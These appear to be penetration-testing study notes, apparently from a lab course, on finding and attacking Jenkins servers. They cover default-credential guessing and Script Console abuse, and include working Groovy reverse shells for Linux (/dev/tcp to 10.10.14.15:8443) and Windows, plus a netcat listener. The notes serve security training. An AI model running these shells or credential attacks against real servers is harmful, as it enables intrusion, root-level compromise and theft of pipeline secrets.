# Jenkins – Discovery and Attacking

## Overview

Jenkins is an open-source automation server written in **Java** and commonly used for:

- continuous integration
- continuous delivery
- automated builds
- testing pipelines
- deployment workflows

It usually runs inside a servlet container such as **Tomcat** and is a common target during internal assessments because it often runs with **high privileges**.

Historically, Jenkins has suffered from:

- weak/default credential exposure
- missing authentication
- excessive built-in functionality
- plugin-related vulnerabilities
- version-specific RCE flaws

## Useful context

From the notes:

- Jenkins was originally named **Hudson** in 2005
- renamed to **Jenkins** in 2011 after a dispute with Oracle
- over **86,000 companies** use Jenkins
- commonly used by:
  - Facebook
  - Netflix
  - Udemy
  - Robinhood
  - LinkedIn
- supports **300+ plugins**

## Why it matters

Jenkins is especially interesting because:

- it is often installed on **Windows servers**
- it often runs as **SYSTEM** on Windows or **root** on Linux
- if you get admin access, **RCE is usually trivial**
- it may be connected to:
  - source code
  - secrets
  - credentials
  - build infrastructure
  - deployment pipelines

Think of Jenkins as a DevOps control tower. If you get into the tower, you often get control of far more than the tower itself.

---

# 1. Discovery / Footprinting

Jenkins often appears during web discovery as a service on:

- **8080** by default
- sometimes **8000** or other non-standard ports depending on deployment

It also commonly uses:

- **5000** for agent/slave communication

## Important ports

| Port | Purpose |
|------|---------|
| 8080 | Default web interface |
| 5000 | Master/agent communication |

## Why it matters

If Jenkins is exposed, especially internally, it can be a very high-value target because:

- build servers often have broad access
- service accounts may be privileged
- secrets/tokens may be stored
- code execution paths are often built in

---

# 2. Authentication / Security Model

Jenkins can use multiple authentication backends, including:

- Jenkins’ own user database
- LDAP
- Unix user database
- delegated container authentication
- no authentication at all

Administrators can also decide whether users are allowed to:

- self-register
- create jobs
- build jobs
- administer Jenkins

## Common real-world weakness

The notes highlight that default installs often use:

- Jenkins’ own user database
- no self-registration

But in practice, you may also find:

- weak credentials
- default credentials
- anonymous access
- missing authentication entirely

---

# 3. Fingerprinting Jenkins

The easiest fingerprint is usually the **login page**.

Example:

```text
http://jenkins.inlanefreight.local:8000/login?from=%2F
```

That login page is usually very distinctive.

Another useful page is:

```text
/configureSecurity/
```

Example from the notes:

```text
http://jenkins.inlanefreight.local:8000/configureSecurity/
```

This can reveal how security is configured if accessible.

## Why this matters

You want to identify:

- whether Jenkins is definitely in use
- whether auth is required
- what security realm is configured
- whether anonymous access may be enabled

---

# 4. What to Check First

Once Jenkins is confirmed, check for:

- no authentication
- weak/default credentials
- anonymous read access
- exposed script console
- build/job creation permissions
- version number
- plugins
- security settings

## Very common quick wins

Try credentials such as:

- `admin:admin`
- other common weak combinations
- environment/company defaults

The notes mention that completely unauthenticated Jenkins instances are not rare internally, and occasionally are found externally too.

---

# 5. Post-Auth Goldmine – Script Console

If you gain admin access, the fastest route to code execution is usually the **Script Console**.

## Path

```text
http://jenkins.inlanefreight.local:8000/script
```

## Why it matters

The Script Console lets users execute **Groovy** scripts inside the Jenkins controller runtime.

That effectively means:

- arbitrary code execution
- command execution on the underlying OS
- easy reverse shell paths
- often high-privilege execution

Groovy is Java-compatible and compiles to Java bytecode, so it is very powerful in this context.

---

# 6. Basic Linux Command Execution via Groovy

A straightforward Groovy snippet from the notes:

```groovy
def cmd = 'id'
def sout = new StringBuffer(), serr = new StringBuffer()
def proc = cmd.execute()
proc.consumeProcessOutput(sout, serr)
proc.waitForOrKill(1000)
println sout
```

## What it does

- runs `id`
- captures stdout/stderr
- prints the result in the Jenkins console

## Example result from the notes

```text
uid=0(root) gid=0(root)
```

That confirms code execution as a highly privileged user.

---

# 7. Linux Reverse Shell via Script Console

The notes included a Groovy-based reverse shell using Bash:

```groovy
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.10.14.15/8443;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
```

## Listener

```bash
nc -lvnp 8443
```

## Example result

```text
connect to [10.10.14.15] from (UNKNOWN) [10.129.201.58] 57844
id
uid=0(root) gid=0(root) groups=0(root)
```

This gives a straightforward shell as the Jenkins service user.

If Jenkins is running as `root`, that is an immediate full compromise of the host.

---

# 8. Windows Command Execution via Script Console

On Windows, the same basic idea applies.

## Simple command execution

```groovy
def cmd = "cmd.exe /c dir".execute();
println("${cmd.text}");
```

This allows basic OS command execution through Groovy.

## Why this matters

If Jenkins is running as:

- `SYSTEM`
- a privileged service account

then this can become a very powerful foothold in Active Directory.

---

# 9. Windows Reverse Shell via Script Console

The notes included a Java-based reverse shell suitable for Windows hosts.

```groovy
String host="localhost";
int port=8044;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```

You would replace:

- `localhost`
- `8044`

with your listener IP and port.

## Alternative Windows path

The notes also mention that on Windows you could:

- add a user and RDP/WinRM in
- or avoid making that kind of change by using a PowerShell download cradle and something like `Invoke-PowerShellTcp.ps1`

---

# 10. Likely Privilege Context

One reason Jenkins is so dangerous is the privilege context it often runs under.

The notes specifically call out:

- **SYSTEM** on Windows
- **root** on Linux

That means a successful exploit may already give you:

- local admin
- full host compromise
- a great AD foothold
- access to service account creds
- access to secrets/build pipelines

---

# 11. Miscellaneous Jenkins RCE Vulnerabilities

The notes mention several version-specific vulnerabilities.

These are worth knowing, but they are more conditional than simply abusing the script console after login.

## CVE-2018-1999002 + CVE-2019-1003000

This exploit chain can lead to:

- pre-auth / low-auth style RCE scenarios
- script security sandbox bypass during compilation
- Groovy-based code execution

The notes describe:

- bypassing `Overall/Read` ACL
- bypassing sandbox restrictions
- downloading/executing a malicious JAR
- affecting Jenkins **2.137**

## Another vuln in Jenkins 2.150.2

The notes mention a flaw allowing code execution via **Node.js** when the user has:

- `JOB` creation
- `BUILD` privileges

This is especially dangerous if:

- anonymous users are enabled
- anonymous users inherit these permissions

---

# 12. Key Operational Takeaway

Even if a public RCE exploit does not apply, **admin access alone is often enough**.

That means when attacking Jenkins, the priority is often:

1. identify Jenkins
2. test auth weaknesses
3. determine privilege level
4. check script console access
5. execute commands / obtain reverse shell

Built-in functionality is often all you need.

---

# 13. Practical Workflow

## Step 1 – identify Jenkins

Check:

- common ports like `8080` / `8000`
- the login page
- `/configureSecurity/`
- Jenkins branding

## Step 2 – determine auth posture

Look for:

- no auth
- weak/default creds
- anonymous access
- self-registration
- exposed security configuration

## Step 3 – test weak credentials

Examples:

- `admin:admin`
- other weak/default pairs

## Step 4 – if authenticated, go to script console

```text
/script
```

## Step 5 – execute harmless command first

Linux example:

```groovy
def cmd = 'id'
def sout = new StringBuffer(), serr = new StringBuffer()
def proc = cmd.execute()
proc.consumeProcessOutput(sout, serr)
proc.waitForOrKill(1000)
println sout
```

Windows example:

```groovy
def cmd = "cmd.exe /c dir".execute();
println("${cmd.text}");
```

## Step 6 – upgrade to reverse shell

Use:

- Bash reverse shell on Linux
- Java socket shell / PowerShell on Windows

## Step 7 – enumerate host and environment

Focus on:

- privilege level
- service account context
- domain membership
- stored secrets
- Jenkins credentials
- build jobs
- plugins
- credentials store
- artifact repos

---

# 14. Useful URLs

## Login page

```text
http://jenkins.inlanefreight.local:8000/login?from=%2F
```

## Configure Global Security

```text
http://jenkins.inlanefreight.local:8000/configureSecurity/
```

## Script Console

```text
http://jenkins.inlanefreight.local:8000/script
```

---

# 15. Useful Snippets

## Linux command execution

```groovy
def cmd = 'id'
def sout = new StringBuffer(), serr = new StringBuffer()
def proc = cmd.execute()
proc.consumeProcessOutput(sout, serr)
proc.waitForOrKill(1000)
println sout
```

## Linux reverse shell

```groovy
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.10.14.15/8443;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
```

## Windows command execution

```groovy
def cmd = "cmd.exe /c dir".execute();
println("${cmd.text}");
```

## Windows reverse shell

```groovy
String host="localhost";
int port=8044;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```

---

# 16. Version-Specific Vulnerability Notes

## Jenkins 2.137
Potential exploit chain involving:

- `CVE-2018-1999002`
- `CVE-2019-1003000`

## Jenkins 2.150.2
Potential code execution path via:

- Node.js
- `JOB` creation
- `BUILD` privileges

## Important reminder

The notes also state that Jenkins **2.303.1 LTS** fixed the specific flaws discussed there.

As always:

- version matters
- plugin set matters
- auth/permission model matters

---

# 17. Key Takeaways

- Jenkins is a very high-value target, especially internally
- it often runs with dangerous privileges such as `SYSTEM` or `root`
- the login page is easy to fingerprint
- weak/default credentials and anonymous access are real-world problems
- once you have admin access, the **Script Console** is usually the fastest path to RCE
- version-specific RCE flaws exist, but built-in functionality is often enough
- Jenkins can be a stepping stone into source code, secrets, infrastructure, and Active Directory

---

# Tags

#jenkins
#ci-cd
#groovy
#script-console
#rce
#windows
#linux
#java
#attacking-common-apps
#pentesting
#ctf
#obsidian